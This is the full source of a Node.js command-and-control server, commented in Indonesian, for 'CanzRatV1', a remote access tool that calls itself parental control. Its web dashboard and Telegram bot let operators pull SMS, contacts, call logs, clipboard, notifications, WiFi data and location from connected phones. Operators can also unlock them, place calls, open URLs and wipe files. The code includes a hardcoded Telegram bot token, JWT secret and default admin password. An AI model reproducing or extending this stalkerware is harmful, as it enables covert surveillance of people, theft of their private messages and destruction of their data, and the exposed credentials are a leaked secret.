const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

// ==================== KONFIGURASI ====================
const PORT = process.env.PORT || 8080;
const JWT_SECRET = 'CanzRatV1_RahasiaSuper_2025'; // GANTI!
const TELEGRAM_TOKEN = '8596409692:AAFKSFQqw-T7bX1ez2ug2w4PqruMGY0ZoP0';
const SUPER_ADMIN_ID = 7667174226; // ID admin utama (yang punya akses penuh)

// ==================== DATABASE SEDERHANA (In-Memory) ====================
// Untuk production sebaiknya pakai file atau database sungguhan (misal SQLite)
let users = [
  {
    id: 1,
    username: 'superadmin',
    password: bcrypt.hashSync('admin123', 10),
    telegramId: SUPER_ADMIN_ID,
    role: 'superadmin', // superadmin, admin, user
    devices: []
  }
];

let admins = [SUPER_ADMIN_ID]; // daftar telegram ID yang punya akses admin

let devices = new Map(); // deviceId -> { userId, ws, lastSeen, ... }
let pendingRegistrations = []; // untuk bot

// ==================== BOT TELEGRAM ====================
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Helper: cek apakah user adalah admin
function isAdmin(chatId) {
  return admins.includes(chatId);
}

// Command /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  let message = 
    `👋 Halo! Ini bot registrasi *CanzRatV1*.\n\n` +
    `🔐 *Cara Daftar:*\n` +
    `1. Ketik /register <username> (contoh: /register joko)\n` +
    `2. Admin akan memproses permintaanmu\n` +
    `3. Nanti kamu dapat password via chat ini\n\n`;

  if (isAdmin(chatId)) {
    message += 
      `👤 *Menu Admin:*\n` +
      `/listusers - Lihat semua user\n` +
      `/adduser <username> - Buat user langsung (tanpa approve)\n` +
      `/deleteuser <username> - Hapus user\n` +
      `/addadmin <telegram_id> - Tambah admin baru\n` +
      `/removeadmin <telegram_id> - Hapus admin\n` +
      `/listadmins - Lihat daftar admin\n`;
  }
  bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// Command /register (user biasa)
bot.onText(/\/register (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1].trim();
  
  // Cek apakah username sudah ada
  if (users.find(u => u.username === username)) {
    bot.sendMessage(chatId, '❌ Username sudah terdaftar!');
    return;
  }
  
  // Simpan pending registration
  pendingRegistrations.push({
    chatId,
    username,
    timestamp: Date.now()
  });
  
  // Kirim notifikasi ke semua admin
  for (let adminId of admins) {
    bot.sendMessage(adminId, 
      `📝 *Permintaan Registrasi Baru*\nUsername: ${username}\nChat ID: ${chatId}\n\nKetik /approve ${username} untuk setujui.`,
      { parse_mode: 'Markdown' }
    );
  }
  
  bot.sendMessage(chatId, '✅ Permintaanmu sudah dikirim ke admin. Tunggu konfirmasi ya.');
});

// Command /approve (admin)
bot.onText(/\/approve (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isAdmin(chatId)) {
    bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
    return;
  }
  
  const username = match[1].trim();
  const pending = pendingRegistrations.find(p => p.username === username);
  if (!pending) {
    bot.sendMessage(chatId, '❌ Tidak ada permintaan dengan username itu.');
    return;
  }
  
  // Generate password random
  const plainPassword = Math.random().toString(36).slice(-8);
  const hashedPassword = await bcrypt.hash(plainPassword, 10);
  
  // Buat user baru
  const newUser = {
    id: users.length + 1,
    username,
    password: hashedPassword,
    telegramId: pending.chatId,
    role: 'user',
    devices: []
  };
  users.push(newUser);
  
  // Hapus dari pending
  pendingRegistrations.splice(pendingRegistrations.findIndex(p => p.username === username), 1);
  
  // Kirim password ke user via bot
  bot.sendMessage(pending.chatId, 
    `🎉 *Akun CanzRatV1 kamu sudah aktif!*\n\n` +
    `Username: ${username}\n` +
    `Password: ${plainPassword}\n\n` +
    `🔐 Simpan baik-baik. Jangan berikan pada siapa pun.`,
    { parse_mode: 'Markdown' }
  );
  
  bot.sendMessage(chatId, `✅ Akun ${username} berhasil dibuat.`);
});

// Command /adduser (admin langsung buat user)
bot.onText(/\/adduser (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isAdmin(chatId)) {
    bot.sendMessage(chatId, '❌ Hanya admin.');
    return;
  }
  
  const username = match[1].trim();
  if (users.find(u => u.username === username)) {
    bot.sendMessage(chatId, '❌ Username sudah ada.');
    return;
  }
  
  const plainPassword = Math.random().toString(36).slice(-8);
  const hashedPassword = await bcrypt.hash(plainPassword, 10);
  
  const newUser = {
    id: users.length + 1,
    username,
    password: hashedPassword,
    telegramId: null,
    role: 'user',
    devices: []
  };
  users.push(newUser);
  
  bot.sendMessage(chatId, 
    `✅ Akun dibuat!\nUsername: ${username}\nPassword: ${plainPassword}\n\n` +
    `User bisa login dengan kredensial ini.`
  );
});

// Command /listusers (admin)
bot.onText(/\/listusers/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAdmin(chatId)) return;
  
  let userList = '📋 *Daftar User:*\n';
  users.forEach(u => {
    userList += `- ${u.username} (${u.role}) ${u.telegramId ? '🔗' : '❌'}\n`;
  });
  bot.sendMessage(chatId, userList, { parse_mode: 'Markdown' });
});

// Command /deleteuser (admin)
bot.onText(/\/deleteuser (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isAdmin(chatId)) return;
  
  const username = match[1].trim();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) {
    bot.sendMessage(chatId, '❌ User tidak ditemukan.');
    return;
  }
  
  // Cegah hapus superadmin
  if (users[index].role === 'superadmin') {
    bot.sendMessage(chatId, '❌ Tidak bisa menghapus superadmin.');
    return;
  }
  
  users.splice(index, 1);
  bot.sendMessage(chatId, `✅ User ${username} dihapus.`);
});

// Command /addadmin (superadmin only)
bot.onText(/\/addadmin (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (chatId != SUPER_ADMIN_ID) {
    bot.sendMessage(chatId, '❌ Hanya superadmin yang bisa menambah admin.');
    return;
  }
  
  const newAdminId = parseInt(match[1].trim());
  if (isNaN(newAdminId)) {
    bot.sendMessage(chatId, '❌ ID harus angka.');
    return;
  }
  
  if (!admins.includes(newAdminId)) {
    admins.push(newAdminId);
    bot.sendMessage(chatId, `✅ Admin ditambahkan: ${newAdminId}`);
  } else {
    bot.sendMessage(chatId, '❌ Sudah menjadi admin.');
  }
});

// Command /removeadmin (superadmin only)
bot.onText(/\/removeadmin (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (chatId != SUPER_ADMIN_ID) {
    bot.sendMessage(chatId, '❌ Hanya superadmin.');
    return;
  }
  
  const adminId = parseInt(match[1].trim());
  if (adminId === SUPER_ADMIN_ID) {
    bot.sendMessage(chatId, '❌ Tidak bisa menghapus superadmin.');
    return;
  }
  
  const index = admins.indexOf(adminId);
  if (index !== -1) {
    admins.splice(index, 1);
    bot.sendMessage(chatId, `✅ Admin ${adminId} dihapus.`);
  } else {
    bot.sendMessage(chatId, '❌ ID bukan admin.');
  }
});

// Command /listadmins (superadmin)
bot.onText(/\/listadmins/, (msg) => {
  const chatId = msg.chat.id;
  if (chatId != SUPER_ADMIN_ID) return;
  
  let adminList = '👑 *Daftar Admin:*\n';
  admins.forEach(id => {
    const user = users.find(u => u.telegramId === id);
    adminList += `- ${id} ${user ? '('+user.username+')' : ''}\n`;
  });
  bot.sendMessage(chatId, adminList, { parse_mode: 'Markdown' });
});

// ==================== HTTP SERVER ====================
const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  
  // API Login
  if (parsedUrl.pathname === '/api/login' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const { username, password } = JSON.parse(body);
        const user = users.find(u => u.username === username);
        
        if (!user || !bcrypt.compareSync(password, user.password)) {
          res.writeHead(401, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Username atau password salah' }));
          return;
        }
        
        const token = jwt.sign({ userId: user.id, username, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ token, username, role: user.role }));
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Bad request' }));
      }
    });
    return;
  }
  
  // Dashboard (halaman login + app)
  if (parsedUrl.pathname === '/' || parsedUrl.pathname === '/dashboard') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
<!DOCTYPE html>
<html>
<head>
  <title>CanzRatV1 - Parental Control</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif; }
    body { background: #0f172a; color: #e2e8f0; }
    #app { max-width: 1400px; margin: 0 auto; padding: 20px; }
    .login-container { max-width: 400px; margin: 100px auto; background: #1e293b; padding: 30px; border-radius: 24px; border: 1px solid #334155; }
    .login-container h2 { color: #3b82f6; margin-bottom: 20px; text-align: center; }
    .input-group { margin-bottom: 20px; }
    .input-group label { display: block; margin-bottom: 5px; color: #94a3b8; }
    .input-group input { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: white; font-size: 16px; }
    .btn { background: #3b82f6; color: white; border: none; padding: 14px; border-radius: 12px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; transition: 0.2s; }
    .btn:active { transform: scale(0.98); }
    .btn-danger { background: #dc2626; }
    .btn-sm { background: #3b82f6; color: white; border: none; padding: 8px 12px; border-radius: 8px; font-size: 12px; cursor: pointer; }
    .error { color: #ef4444; margin-top: 10px; text-align: center; }
    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; flex-wrap: wrap; }
    .header h1 { color: #3b82f6; }
    .logout { background: #dc2626; padding: 8px 16px; border-radius: 30px; cursor: pointer; font-size: 14px; }
    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
    .card { background: #1e293b; border-radius: 24px; padding: 20px; border: 1px solid #334155; }
    .card-title { font-size: 18px; font-weight: 600; margin-bottom: 20px; color: #94a3b8; display: flex; align-items: center; gap: 8px; }
    .device-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
    .device-id { background: #0f172a; padding: 4px 12px; border-radius: 20px; font-family: monospace; font-size: 12px; }
    .online { color: #10b981; }
    .offline { color: #ef4444; }
    .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #334155; }
    .info-row:last-child { border-bottom: none; }
    .label { color: #94a3b8; }
    .value { font-weight: 500; }
    .btn-group { display: flex; gap: 10px; margin: 15px 0; flex-wrap: wrap; }
    .tab-container { margin-bottom: 20px; }
    .tab { display: inline-block; padding: 10px 20px; background: #1e293b; cursor: pointer; border-radius: 30px 30px 0 0; margin-right: 5px; }
    .tab.active { background: #3b82f6; }
    .tab-content { display: none; }
    .tab-content.active { display: block; }
    .log-box { background: #0f172a; border-radius: 16px; padding: 15px; height: 300px; overflow-y: auto; font-size: 12px; margin-top: 20px; }
    .log-entry { padding: 4px 0; border-bottom: 1px solid #1e293b; color: #a5f3fc; }
    .admin-panel { background: #2d3a4f; border-radius: 16px; padding: 20px; margin-bottom: 20px; border-left: 4px solid #f59e0b; }
  </style>
</head>
<body>
  <div id="app">
    <div id="login-view" class="login-container">
      <h2>🔐 CanzRatV1 Login</h2>
      <div class="input-group">
        <label>Username</label>
        <input type="text" id="login-username" placeholder="Username">
      </div>
      <div class="input-group">
        <label>Password</label>
        <input type="password" id="login-password" placeholder="Password">
      </div>
      <button class="btn" onclick="doLogin()">Login</button>
      <div id="login-error" class="error"></div>
      <div style="margin-top:20px; text-align:center; color:#64748b;">
        Belum punya akun? Hubungi admin via Telegram.
      </div>
    </div>
    
    <div id="dashboard-view" style="display:none;">
      <div class="header">
        <h1>🛡️ CanzRatV1 Dashboard</h1>
        <div>
          <span id="username-display" style="margin-right:15px;"></span>
          <span class="logout" onclick="logout()">Logout</span>
        </div>
      </div>
      
      <!-- Admin Panel (hanya tampil jika role = superadmin atau admin) -->
      <div id="admin-panel" class="admin-panel" style="display:none;">
        <h3 style="color:#f59e0b; margin-bottom:15px;">👑 Panel Admin</h3>
        <div class="btn-group">
          <button class="btn-sm" onclick="fetchUsers()">📋 List Users</button>
          <button class="btn-sm" onclick="showAddUserPrompt()">➕ Add User</button>
          <button class="btn-sm" onclick="showDeleteUserPrompt()">❌ Delete User</button>
        </div>
        <div id="admin-result" style="margin-top:15px; background:#0f172a; padding:10px; border-radius:8px; max-height:200px; overflow-y:auto; font-size:12px;"></div>
      </div>
      
      <!-- Tab Navigasi -->
      <div class="tab-container">
        <span class="tab active" onclick="switchTab('devices')">📱 Perangkat</span>
        <span class="tab" onclick="switchTab('logs')">📋 Log Global</span>
      </div>
      
      <!-- Tab Perangkat -->
      <div id="tab-devices" class="tab-content active">
        <div class="grid" id="devicesContainer">
          <div style="grid-column:1/-1; text-align:center; padding:50px; color:#475569;">
            Menunggu koneksi dari perangkat anak...
          </div>
        </div>
      </div>
      
      <!-- Tab Log -->
      <div id="tab-logs" class="tab-content">
        <div class="card">
          <div class="card-title">📋 Log Aktivitas</div>
          <div class="log-box" id="globalLog"></div>
        </div>
      </div>
    </div>
  </div>
  
  <script>
    let token = localStorage.getItem('token');
    let userRole = localStorage.getItem('role');
    let ws = null;
    let devices = new Map();
    
    if (token) {
      document.getElementById('login-view').style.display = 'none';
      document.getElementById('dashboard-view').style.display = 'block';
      document.getElementById('username-display').innerText = localStorage.getItem('username') || '';
      if (userRole === 'superadmin' || userRole === 'admin') {
        document.getElementById('admin-panel').style.display = 'block';
      }
      connectWebSocket();
    }
    
    function doLogin() {
      const username = document.getElementById('login-username').value;
      const password = document.getElementById('login-password').value;
      
      fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      })
      .then(res => res.json())
      .then(data => {
        if (data.error) {
          document.getElementById('login-error').innerText = data.error;
        } else {
          token = data.token;
          userRole = data.role;
          localStorage.setItem('token', token);
          localStorage.setItem('username', data.username);
          localStorage.setItem('role', data.role);
          document.getElementById('login-view').style.display = 'none';
          document.getElementById('dashboard-view').style.display = 'block';
          document.getElementById('username-display').innerText = data.username;
          if (userRole === 'superadmin' || userRole === 'admin') {
            document.getElementById('admin-panel').style.display = 'block';
          }
          connectWebSocket();
        }
      })
      .catch(err => {
        document.getElementById('login-error').innerText = 'Network error';
      });
    }
    
    function logout() {
      localStorage.removeItem('token');
      localStorage.removeItem('username');
      localStorage.removeItem('role');
      if (ws) ws.close();
      document.getElementById('dashboard-view').style.display = 'none';
      document.getElementById('login-view').style.display = 'block';
    }
    
    function connectWebSocket() {
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      ws = new WebSocket(protocol + '//' + window.location.host + '?token=' + token);
      
      ws.onopen = () => {
        addLog('✅ Terhubung ke server');
      };
      
      ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        
        if (data.type === 'device_list') {
          devices = new Map(Object.entries(data.devices));
          renderDevices();
        } 
        else if (data.type === 'location' || data.type === 'location_update') {
          if (devices.has(data.deviceId)) {
            const device = devices.get(data.deviceId);
            device.lastLocation = { lat: data.lat, lng: data.lng, time: data.timestamp };
            devices.set(data.deviceId, device);
            renderDevices();
          }
          addLog('📍 [' + data.deviceId + '] Lokasi: ' + data.lat + ', ' + data.lng);
        }
        else if (data.type === 'activity') {
          addLog('📱 [' + data.deviceId + '] ' + data.activity);
        }
        else if (data.type === 'panic') {
          addLog('🚨🚨🚨 [' + data.deviceId + '] PANIC: ' + data.message);
        }
        else if (data.type === 'sms_data') {
          addLog('📨 [' + data.deviceId + '] Data SMS diterima');
          // Bisa tampilkan detail lebih lanjut
        }
        else {
          addLog('📨 ' + JSON.stringify(data));
        }
      };
      
      ws.onclose = () => {
        addLog('❌ Disconnected');
        setTimeout(connectWebSocket, 3000);
      };
    }
    
    function addLog(msg) {
      const logEl = document.getElementById('globalLog');
      if (!logEl) return;
      const entry = document.createElement('div');
      entry.className = 'log-entry';
      entry.innerHTML = '<span style="color:#64748b;">' + new Date().toLocaleTimeString() + '</span> ' + msg;
      logEl.appendChild(entry);
      logEl.scrollTop = logEl.scrollHeight;
    }
    
    function renderDevices() {
      const container = document.getElementById('devicesContainer');
      if (devices.size === 0) {
        container.innerHTML = '<div style="grid-column:1/-1; text-align:center; padding:50px; color:#475569;">Belum ada perangkat anak yang terhubung</div>';
        return;
      }
      
      let html = '';
      for (let [deviceId, device] of devices) {
        const isOnline = (Date.now() - (device.lastSeen || 0) < 15000);
        html += \`
          <div class="card">
            <div class="device-header">
              <span class="device-id">\${deviceId}</span>
              <span class="\${isOnline ? 'online' : 'offline'}">\${isOnline ? '● ONLINE' : '○ OFFLINE'}</span>
            </div>
            <div class="info-row">
              <span class="label">Lokasi:</span>
              <span class="value">\${device.lastLocation ? 
                device.lastLocation.lat.toFixed(4) + ', ' + device.lastLocation.lng.toFixed(4) : 
                'Belum ada'}</span>
            </div>
            <div class="info-row">
              <span class="label">Terakhir:</span>
              <span class="value">\${device.lastSeen ? new Date(device.lastSeen).toLocaleTimeString() : '-'}</span>
            </div>
            
            <!-- Fitur Lihat Data -->
            <div style="margin:10px 0; font-weight:600; color:#3b82f6;">👁️ Lihat Data</div>
            <div class="btn-group">
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'get_sms')">📨 SMS</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'get_contacts')">👤 Kontak</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'get_calls')">📞 Panggilan</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'get_location')">📍 Lokasi</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'get_apps')">📱 Aplikasi</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'get_clipboard')">📋 Clipboard</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'get_notifications')">🔔 Notifikasi</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'get_wifi')">📶 WiFi</button>
            </div>
            
            <!-- Fitur Kontrol -->
            <div style="margin:10px 0; font-weight:600; color:#f59e0b;">⚡ Kontrol</div>
            <div class="btn-group">
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'unlock')">🔓 Unlock</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'lock')">🔒 Kunci</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'call', {number:'08123456789'})">📞 Panggil</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'wallpaper', {url:'https://example.com/image.jpg'})">🖼️ Wallpaper</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'play_audio', {url:'https://example.com/sound.mp3'})">🎵 Musik</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'notify', {title:'Pesan', body:'Halo anak'})">📢 Notif</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'open_url', {url:'https://google.com'})">🌐 Buka Web</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'flashlight_on')">🔦 Senter On</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'flashlight_off')">🔦 Senter Off</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'vibrate', {duration:1000})">📳 Getar</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'toast', {text:'Halo dari ortu'})">💬 Teks Layar</button>
              <button class="btn-sm" onclick="sendCommand('\${deviceId}', 'tts', {text:'Tidur nak'})">🗣️ Suara</button>
              <button class="btn-sm btn-danger" onclick="if(confirm('Yakin hapus semua file?')) sendCommand('\${deviceId}', 'wipe')">⚠️ Hapus File</button>
            </div>
          </div>
        \`;
      }
      container.innerHTML = html;
    }
    
    function sendCommand(deviceId, command, payload = {}) {
      if (!ws || ws.readyState !== WebSocket.OPEN) {
        alert('WebSocket tidak terhubung');
        return;
      }
      ws.send(JSON.stringify({
        type: 'command',
        targetDevice: deviceId,
        command: command,
        payload: payload,
        timestamp: new Date().toISOString()
      }));
      addLog('📤 Perintah ' + command + ' ke ' + deviceId);
    }
    
    function switchTab(tab) {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
      if (tab === 'devices') {
        document.querySelector('.tab').classList.add('active');
        document.getElementById('tab-devices').classList.add('active');
      } else {
        document.querySelectorAll('.tab')[1].classList.add('active');
        document.getElementById('tab-logs').classList.add('active');
      }
    }
    
    // Fungsi admin panel
    function fetchUsers() {
      // Di sini seharusnya ada endpoint API untuk ambil daftar user
      // Untuk sementara kita panggil bot aja via WebSocket? Bisa juga buat endpoint HTTP
      // Tapi karena server.js tidak punya API list user, kita arahkan ke bot
      alert('Gunakan bot Telegram untuk melihat daftar user: /listusers');
    }
    
    function showAddUserPrompt() {
      const username = prompt('Masukkan username baru:');
      if (username) {
        // Bisa kirim perintah ke bot via HTTP? Lebih mudah pakai bot manual.
        alert('Gunakan bot Telegram: /adduser ' + username);
      }
    }
    
    function showDeleteUserPrompt() {
      const username = prompt('Masukkan username yang akan dihapus:');
      if (username) {
        alert('Gunakan bot Telegram: /deleteuser ' + username);
      }
    }
    
    // Ping setiap 30 detik
    setInterval(() => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'ping' }));
      }
    }, 30000);
  </script>
</body>
</html>
    `);
    return;
  }
  
  res.writeHead(404);
  res.end('Not Found');
});

// ==================== WEBSOCKET SERVER ====================
const wss = new WebSocket.Server({ server, clientTracking: true });

// Middleware autentikasi WebSocket
wss.on('connection', (ws, req) => {
  const parameters = url.parse(req.url, true);
  const token = parameters.query.token;
  
  if (!token) {
    ws.close(1008, 'No token');
    return;
  }
  
  let user;
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    user = users.find(u => u.id === decoded.userId);
    if (!user) throw new Error('User not found');
  } catch (e) {
    ws.close(1008, 'Invalid token');
    return;
  }
  
  ws.user = user;
  console.log('🔌 Client connected, user:', user.username);
  
  // Kirim daftar device milik user ini
  const userDevices = {};
  for (let [id, device] of devices) {
    if (device.userId === user.id) {
      userDevices[id] = {
        role: device.role,
        lastSeen: device.lastSeen,
        lastLocation: device.lastLocation
      };
    }
  }
  ws.send(JSON.stringify({ type: 'device_list', devices: userDevices }));
  
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      
      // Handle register device (dari perangkat anak)
      if (data.type === 'register') {
        // Untuk sementara, kita asumsikan device anak tidak perlu autentikasi terpisah
        // Tapi sebaiknya ada mekanisme pairing
        devices.set(data.deviceId, {
          ws: ws,
          userId: user.id,
          role: data.role,
          lastSeen: Date.now(),
          lastLocation: null
        });
        console.log('📝 Registered device:', data.deviceId, 'for user:', user.username);
        broadcastDeviceListToUser(user.id);
      }
      
      // Update location dari perangkat anak
      else if (data.type === 'location' || data.type === 'location_update') {
        const device = devices.get(data.deviceId);
        if (device && device.userId === user.id) {
          device.lastLocation = { lat: data.lat, lng: data.lng };
          device.lastSeen = Date.now();
          devices.set(data.deviceId, device);
          broadcastToUser(user.id, data);
        }
      }
      
      // Data dari anak
      else if (data.type === 'sms_data' || data.type === 'contacts_data' || data.type === 'calls_data' || 
               data.type === 'apps_data' || data.type === 'clipboard_data' || data.type === 'notifications_data' ||
               data.type === 'wifi_data') {
        const device = devices.get(data.deviceId);
        if (device && device.userId === user.id) {
          broadcastToUser(user.id, data);
        }
      }
      
      // Activity dari anak
      else if (data.type === 'activity') {
        const device = devices.get(data.deviceId);
        if (device && device.userId === user.id) {
          broadcastToUser(user.id, data);
        }
      }
      
      // Panic dari anak
      else if (data.type === 'panic') {
        const device = devices.get(data.deviceId);
        if (device && device.userId === user.id) {
          broadcastToUser(user.id, data);
        }
      }
      
      // Command dari parent ke child
      else if (data.type === 'command') {
        const targetDevice = devices.get(data.targetDevice);
        if (targetDevice && targetDevice.userId === user.id && targetDevice.ws.readyState === WebSocket.OPEN) {
          targetDevice.ws.send(JSON.stringify({
            type: 'command',
            command: data.command,
            payload: data.payload
          }));
        }
      }
      
      // Update lastSeen untuk semua koneksi
      for (let [id, device] of devices) {
        if (device.ws === ws) {
          device.lastSeen = Date.now();
          devices.set(id, device);
          break;
        }
      }
      
    } catch (e) {
      console.error('Error processing message:', e);
    }
  });
  
  ws.on('close', () => {
    for (let [id, device] of devices) {
      if (device.ws === ws) {
        devices.delete(id);
        console.log('❌ Device disconnected:', id);
        broadcastDeviceListToUser(device.userId);
        break;
      }
    }
  });
});

function broadcastToUser(userId, message) {
  const msgString = JSON.stringify(message);
  for (let [id, device] of devices) {
    if (device.role === 'parent' && device.userId === userId && device.ws.readyState === WebSocket.OPEN) {
      device.ws.send(msgString);
    }
  }
}

function broadcastDeviceListToUser(userId) {
  const userDevices = {};
  for (let [id, device] of devices) {
    if (device.userId === userId) {
      userDevices[id] = {
        role: device.role,
        lastSeen: device.lastSeen,
        lastLocation: device.lastLocation
      };
    }
  }
  const message = JSON.stringify({ type: 'device_list', devices: userDevices });
  
  for (let [id, device] of devices) {
    if (device.role === 'parent' && device.userId === userId && device.ws.readyState === WebSocket.OPEN) {
      device.ws.send(message);
    }
  }
}

// Cleanup periodik
setInterval(() => {
  const now = Date.now();
  for (let [id, device] of devices) {
    if (device.ws.readyState !== WebSocket.OPEN) {
      devices.delete(id);
      console.log('🧹 Cleaned up dead device:', id);
      broadcastDeviceListToUser(device.userId);
    } else if (now - device.lastSeen > 60000) {
      if (device.ws.readyState === WebSocket.OPEN) {
        device.ws.send(JSON.stringify({ type: 'ping' }));
      }
    }
  }
}, 30000);

server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════╗
║        CanzRatV1 - MULTI-USER           ║
╠══════════════════════════════════════════╣
║  • Dashboard: http://localhost:${PORT}   ║
║  • WebSocket: ws://localhost:${PORT}     ║
║  • Bot Telegram aktif                    ║
║  • Super Admin ID: ${SUPER_ADMIN_ID}     ║
╚══════════════════════════════════════════╝
  `);
});
